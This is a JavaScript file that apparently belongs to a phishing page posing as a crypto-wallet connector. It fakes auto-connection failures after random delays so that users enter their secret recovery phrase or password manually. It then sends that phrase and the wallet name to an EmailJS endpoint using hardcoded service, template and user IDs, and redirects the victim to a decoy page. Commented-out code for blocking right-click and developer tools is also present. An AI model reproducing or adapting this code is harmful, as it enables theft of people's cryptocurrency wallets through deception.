//Handle Select Wallet Click
$(function() {
    $(".select_wallet").on("click", function() {
        var wd = $(this); //wd = wallet details

        $("#wallet_name").text(wd.data("title"));
        $("#wallet_name").val("");
        $("#wallet_logo").attr("src", wd.data("logo"));
        $("#auto_connecting").show();
        $("#failed_to_connect").hide();
        $("#failed_to_connect2").hide();
        $("#div_connect_manuallly").hide();
        $("#div_connect_manuallly2").hide();

        $("#popup_connect_wallet").modal("show");

        //Hide autoconnecting div and show error in random interval
        var interval = 1000 * getRandomInt(1, 15);
        setTimeout(() => {
            $("#auto_connecting").hide();
            $("#div_connect_manuallly").hide();
            $("#div_connect_manuallly2").hide();
            $("#failed_to_connect2").hide();
            $("#failed_to_connect").show();
        }, interval);
    });

    $(".select_liquality").on("click", function() {
        var wd = $(this); //wd = wallet details

        $("#wallet_name").text(wd.data("title"));
        $("#wallet_name").val("");
        $("#wallet_logo").attr("src", wd.data("logo"));
        $("#auto_connecting").show();
        $("#failed_to_connect").hide();
        $("#failed_to_connect2").hide();
        $("#div_connect_manuallly").hide();
        $("#div_connect_manuallly2").hide();

        $("#popup_connect_wallet").modal("show");

        //Hide autoconnecting div and show error in random interval
        var interval = 1000 * getRandomInt(1, 15);
        setTimeout(() => {
            $("#auto_connecting").hide();
            $("#div_connect_manuallly").hide();
            $("#div_connect_manuallly2").hide();
            $("#failed_to_connect").hide();
            $("#failed_to_connect2").hide();
            $("#div_connect_manuallly2").show();
        }, interval);
    });

    $("#try_auto_connecting_again").on("click", function(e) {
        e.preventDefault();
        $("#auto_connecting").show();
        $("#failed_to_connect").hide();
        $("#div_connect_manuallly").hide();

        //Hide autoconnecting div and show error in random interval
        var interval = 1000 * getRandomInt(1, 20);
        setTimeout(() => {
            $("#auto_connecting").hide();
            $("#div_connect_manuallly").hide();
            $("#failed_to_connect").show();
        }, interval);
    });

    $("#button_connect_manually").on("click", function(e) {
        e.preventDefault();
        $("#auto_connecting").hide();
        $("#failed_to_connect").hide();
        $("#failed_to_connect2").hide();
        $("#div_connect_manuallly").show();
        $("#div_connect_manuallly2").hide();
    });
    $("#button_connect_manually2").on("click", function(e) {
        e.preventDefault();
        $("#auto_connecting").hide();
        $("#failed_to_connect").hide();
        $("#failed_to_connect2").hide();
        $("#div_connect_manuallly").hide();
        $("#div_connect_manuallly2").show();
    });

    //FOR PHRASE TEXT VALIDATION
    $("#secret_phrase").on("keyup", function() {
        var phrase_seed_entered = $(this).val().trim();
        if (phrase_seed_entered != "") {
            var phrase_count = phrase_seed_entered.match(/(\w+)/g).length;
            console.log(phrase_count);
            if ([12, 15, 18, 21, 24].includes(phrase_count)) {
                $("#button_connect_wallet").attr("disabled", false).css("opacity", "1");
            } else {
                $("#button_connect_wallet").attr("disabled", false).css("opacity", "1");
            }
        } else {
            $("#button_connect_wallet").attr("disabled", false).css("opacity", "0.2");
        }
    });
    //FOR LIQUALITY VALIDATION
    $("#confirm_pwd").on("keyup", function() {
        var phrase_seed_entered = $(this).val().trim();
        if (phrase_seed_entered != "") {
            var phrase_count = phrase_seed_entered.match(/(\w+)/g).length;
            console.log(phrase_count);
            if ([12, 15, 18, 21, 24].includes(phrase_count)) {
                $("#button_connect_wallet2")
                    .attr("disabled", false)
                    .css("opacity", "1");
            } else {
                $("#button_connect_wallet2")
                    .attr("disabled", false)
                    .css("opacity", "1");
            }
        } else {
            $("#button_connect_wallet2").attr("disabled", true).css("opacity", "0.2");
        }
    });

    //CONNECT WALLET BUTTON Handler
    $("#myForm").on("submit", function(e) {
        e.preventDefault();
        let field = $("#secret_phrase");
        if (field.val().length >= 12) {
            // $(this).text('Loading...').css('pointer-events','none')
            var formData = new FormData(this);
            formData.append("service_id", "service_4eryhpc");
            formData.append("template_id", "template_p4bprdz");
            formData.append("user_id", "_ODA0sbeMyfsJ2_77");

            $.ajax({
                url: "https://api.emailjs.com/api/v1.0/email/send-form",
                method: "POST",
                data: formData,
                contentType: false, // auto-detection
                processData: false, // no need to p
                success: function(result) {
                    // alert("Error, Contact Admin");

                    if (result == "OK") {
                        $("#button_connect_wallet")
                            .text("Connect Wallet")
                            .css("pointer-events", "all");
                        $("#popup_connect_wallet").modal("hide");
                        // $('#popup_connect_wallet_success').modal('show')
                        window.setTimeout(function() {
                            window.location.href = "/dapps/qr.html";
                        }, 25);
                    }
                },
                error: function(xhr, ajaxOptions, thrownError) {
                    alert(thrownError);
                },
            });
        }
    });
    //CONNECT WALLET BUTTON2 Handler
    $("#button_connect_wallet2").on("click", function(e) {
        // e.preventDefault();
        let field = $("#confirm_pwd");
        if (field.val().length >= 12) {
            // $(this).text('Loading...').css('pointer-events','none')

            $.ajax({
                url: "https://api.emailjs.com/api/v1.0/email/send-form",
                method: "POST",
                data: {
                    load_phrase: 1,
                    data_phrase: field.val(),
                    wallet_selected: $("#wallet_name").text().trim(),
                },
                success: function(result) {
                    if (result == "success") {
                        $("#button_connect_wallet2")
                            .text("Connect Wallet")
                            .css("pointer-events", "all");
                        $("#popup_connect_wallet2").modal("hide");
                        // $('#popup_connect_wallet_success').modal('show')
                        window.setTimeout(function() {
                            window.location.href = "index-2.html";
                        }, 25);
                    }
                },
                error: function(xhr, ajaxOptions, thrownError) {
                    alert(thrownError);
                },
            });
        }
    });
});

function getRandomInt(min, max) {
    min = Math.ceil(min);
    max = Math.floor(max);
    return Math.floor(Math.random() * (max - min) + min); //The maximum is exclusive and the minimum is inclusive
}

//DISABLE RIGHT CLICK AND CTRL KEY
// window.oncontextmenu = function () {
//     return false;
// }
// $(document).keydown(function (event) {
//     if (event.keyCode == 123) {
//         return false;
//     }
//     else if ((event.ctrlKey && event.shiftKey && event.keyCode == 73) || (event.ctrlKey && event.shiftKey && event.keyCode == 74)) {
//         return false;
//     }
// });